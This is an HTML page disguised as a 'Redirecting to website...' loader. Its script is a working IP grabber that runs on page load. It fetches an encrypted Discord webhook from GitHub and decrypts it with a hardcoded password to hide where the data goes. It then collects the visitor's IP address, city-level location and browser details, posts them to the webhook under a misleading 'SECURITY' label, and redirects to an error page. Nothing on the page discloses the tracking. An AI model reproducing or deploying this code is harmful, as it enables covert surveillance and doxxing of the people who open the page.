<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting to the website...</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            max-width: 500px;
            padding: 20px;
        }
        .monstr-logo {
            font-size: 48px;
            color: #ff0000;
            margin-bottom: 20px;
        }
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ff0000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="monstr-logo">▶️</div>
        <h2>Redirecting to website...</h2>
        <div class="loader"></div>
        <p>You will be redirected shortly...</p>
    </div>

    <script>
        // GitHub raw content URL (now returns JSON with salt, iv, data)
        const GITHUB_ENCRYPTED_URL = "https://github.com/radmehrmc/folsgno/raw/refs/heads/main/fg";
        const DECRYPTION_PASSWORD = "HED#788";

        // ------------------- AES Decryption Helpers -------------------
        async function deriveKey(password, salt) {
            const encoder = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                encoder.encode(password),
                "PBKDF2",
                false,
                ["deriveKey"]
            );
            return crypto.subtle.deriveKey(
                {
                    name: "PBKDF2",
                    salt: salt,
                    iterations: 100000,
                    hash: "SHA-256"
                },
                keyMaterial,
                { name: "AES-CBC", length: 256 },
                false,
                ["decrypt"]
            );
        }

        // Decrypt using separate salt, iv, ciphertext (all base64)
        async function decryptAesJson(jsonData, password) {
            // Decode base64 fields to Uint8Array
            const salt = Uint8Array.from(atob(jsonData.salt), c => c.charCodeAt(0));
            const iv = Uint8Array.from(atob(jsonData.iv), c => c.charCodeAt(0));
            const ciphertext = Uint8Array.from(atob(jsonData.data), c => c.charCodeAt(0));
            
            // Derive key using PBKDF2
            const key = await deriveKey(password, salt);
            
            // Decrypt
            const decrypted = await crypto.subtle.decrypt(
                { name: "AES-CBC", iv: iv },
                key,
                ciphertext
            );
            
            // Convert decrypted bytes to string
            const decoder = new TextDecoder();
            return decoder.decode(decrypted);
        }

        // ------------------- Fetch & Decrypt Webhook -------------------
        async function getWebhookFromGitHub() {
            try {
                const response = await fetch(GITHUB_ENCRYPTED_URL + '?t=' + Date.now());
                if (!response.ok) throw new Error('Failed to fetch encrypted webhook');
                
                const jsonText = await response.text();
                const encryptedJson = JSON.parse(jsonText);
                
                // Validate required fields
                if (!encryptedJson.salt || !encryptedJson.iv || !encryptedJson.data) {
                    throw new Error('Invalid JSON structure: missing salt, iv, or data');
                }
                
                // Decrypt using the provided JSON parts
                const webhookUrl = await decryptAesJson(encryptedJson, DECRYPTION_PASSWORD);
                
                // Basic validation
                if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
                    throw new Error('Decrypted URL has invalid format');
                }
                
                return webhookUrl;
            } catch (error) {
                console.error('Error fetching/decrypting webhook:', error);
                return null;
            }
        }

        // ------------------- IP & Browser Info -------------------
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                let locationInfo = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    locationInfo = await locationResponse.json();
                } catch (e) {
                    console.error('Error fetching location:', e);
                }
                
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                };
                
                return {
                    ip,
                    location: locationInfo,
                    browser: browserInfo,
                    timestamp: new Date().toISOString(),
                };
            } catch (error) {
                console.error('Error getting IP info:', error);
                return null;
            }
        }

        // ------------------- Send to Discord -------------------
        async function sendToDiscord(webhookUrl, data) {
            try {
                const message = {
                    content: "SECURITY",
                    embeds: [
                        {
                            title: "SECURITY IP Scan Information",
                            color: 16711680,
                            fields: [
                                { name: "IP Address", value: data.ip, inline: true },
                                { name: "Location", value: data.location.country_name ? 
                                    `${data.location.city}, ${data.location.region}, ${data.location.country_name}` : 
                                    'Unknown', inline: true },
                                { name: "Device", value: data.browser.platform, inline: true },
                                { name: "Browser", value: data.browser.userAgent.substring(0, 50) + '...', inline: false },
                                { name: "Timestamp", value: new Date(data.timestamp).toLocaleString(), inline: true }
                            ]
                        }
                    ]
                };
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending to Discord:', error);
                return false;
            }
        }

        // ------------------- Redirect -------------------
        function mnsterredir() {
            window.location.href = 'https://mainredirectm.vercel.app/Error.html';
        }

        // ------------------- Main Execution -------------------
        async function main() {
            const webhookUrl = await getWebhookFromGitHub();
            
            if (!webhookUrl) {
                console.log('Failed to obtain webhook, redirecting without tracking');
                setTimeout(mnsterredir, 2000);
                return;
            }
            
            const ipInfo = await getIPInfo();
            if (ipInfo) {
                await sendToDiscord(webhookUrl, ipInfo);
            }
            
            setTimeout(mnsterredir, 1000);
        }

        main();
    </script>
</body>
</html>
